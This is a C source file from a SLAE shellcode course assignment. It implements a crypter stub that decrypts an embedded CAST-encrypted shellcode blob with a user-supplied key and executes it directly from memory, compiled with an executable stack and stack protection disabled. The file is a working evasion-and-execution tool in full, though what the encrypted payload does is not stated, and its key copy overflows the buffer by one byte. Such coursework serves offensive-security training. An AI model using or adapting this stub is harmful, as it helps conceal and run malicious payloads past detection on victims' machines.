/*
 *      SLAE - Assignment #7: Custom Decrypt and execute Shellcode (Linux/x86)
 *      author: Alain Menelet 
 *      StudentID - SLAE-3763
 *      HowTo: gcc -fno-stack-protector -z execstack decrypt.c -o decrypt -lssl -lcrypto
 */


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/cast.h>

void affichageVar(unsigned char* tab, int length, char *name);
void affichage(unsigned char* tab, int length, char* name);
void exec(unsigned char* shellcode);

int main(int argc, char *argv[])
{
    CAST_KEY key;

    if (argc < 2)
    {
        printf ("usage ./decrypt [key]\n");
        exit(1);
    }

    // We define here the key
    unsigned char key_data[CAST_KEY_LENGTH]; 

    if (strlen(argv[1]) != 16)
    {
        printf("Taille de le clé incorrecte");
        exit(1);
    }
    strcpy(key_data, argv[1]);


    // We define the Interupt Vector
    unsigned char iv[CAST_BLOCK];
    unsigned char iv_data[CAST_BLOCK] = {
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef
    };

    
	unsigned char shellcode[] = \
		"\x93\x13\xe1\xb2\x5e\x68\xd6\xfa\x71\x8a\x2b\x40\x92\x68\x0b\xf1\x3f\xc7\xba\x74\x4e\xfc\x1f\xcb\xbf\x05\xd8\x92\x3e\x78\x49\x34\x89\x0b\x96\x6f\x19\x48\x4a\xda";

	// Round up the length to a multiple of 16 */
    int length  = (int)(strlen(shellcode) + (CAST_BLOCK - 1)) & ~(CAST_BLOCK - 1);

    // temp array for the original shellcode
    // All values are set to 0 because length is a multiple of 16
    char* origin  = (char*) malloc(sizeof(char) * length); 

	// Copy the IV data to the IV array 
    memcpy(iv, iv_data, CAST_BLOCK);
    affichageVar(key_data, CAST_KEY_LENGTH, "Key");
    affichageVar(iv_data, CAST_BLOCK, "IV");

    // Set the key
    CAST_set_key(&key, CAST_KEY_LENGTH * 8, key_data);
    
    // decrypt, store the decrypted shellcode into origin
    CAST_cbc_encrypt(shellcode, origin, length, &key, iv, CAST_DECRYPT);

    affichage(origin, length, "decrypted");
    printf("\n[+] Shellcode executing ...");
	
    // Execute the decrypted shellcode
    exec(origin);

    return 0;
}

void affichageVar(unsigned char* tab, int length, char* name)
{
	int i;
	printf("\n[+] %s: ", name);
	for (i = 0; i < length; i++)
        	printf("\\x%02x", *(tab+i));
	
}

void affichage(unsigned char* tab, int length, char* name)
{
        int i;
        printf("\n[+] %s Shellcode: ",name);
        for (i = 0; i < length; i++)
                printf("\\x%02x", *(tab+i));

}

void exec(unsigned char* shellcode)
{
	printf("\n[+] Shellcode executing ...");
	int (*ret)() = (int(*)())shellcode;
	ret();

}
